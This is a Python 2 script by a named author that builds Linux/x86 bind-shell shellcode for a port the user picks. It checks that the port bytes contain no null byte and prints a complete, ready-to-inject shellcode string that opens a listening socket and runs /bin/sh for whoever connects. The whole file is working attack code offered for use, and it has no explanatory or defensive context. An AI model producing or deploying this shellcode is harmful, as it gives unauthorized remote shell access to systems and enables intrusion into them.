#!/usr/bin/python
# Title: Linux/x86 Bind Shell code creator
# Author: Zsolt Agoston (agzsolt)

import sys

if len(sys.argv)<2:
        print "Usage: "+sys.argv[0]+" [port number]"
        exit()

port = int(sys.argv[1])

if port > 65535 or port < 1:
        print "[!] Port value must be between 1 and 65535!"
        exit()

hexport = hex(port)[2:].zfill(4)        # if the value is shorter than 4 chars, it inserts leading 0-s

fbyte = hexport[0:2]                    # put first byte of port in fbyte, second byte on sbyte
sbyte = hexport[2:4]

if fbyte == "00" or sbyte == "00":
        print "Port value in hex contains a zero byte which is not permitted!"
        exit()
print "\033[1;36m\nBind shell on port tcp/" + str(port) + ", in hex: 0x" + hexport + "\033[1;m\n"

shellcode = (
"\\x6a\\x66\\x58\\x31\\xdb\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6"+
"\\x99\\x52\\x66\\x68\033[1;32m\\x" + fbyte + "\\x" + sbyte + "\033[1;m\\x66\\x6a\\x02\\x89\\xe1\\xb0\\x66\\x43\\x6a\\x10"+
"\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x52\\x56\\x89\\xe1\\xcd\\x80"+
"\\xb0\\x66\\x43\\x52\\x52\\x56\\x89\\xe1\\xcd\\x80\\x89\\xc3\\x6a\\x02\\x59\\xb0"+
"\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f"+
"\\x2f\\x62\\x69\\x89\\xe3\\x31\\xc9\\xcd\\x80")

print "Shellcode:\n\n\"" + shellcode + "\"\n\n"
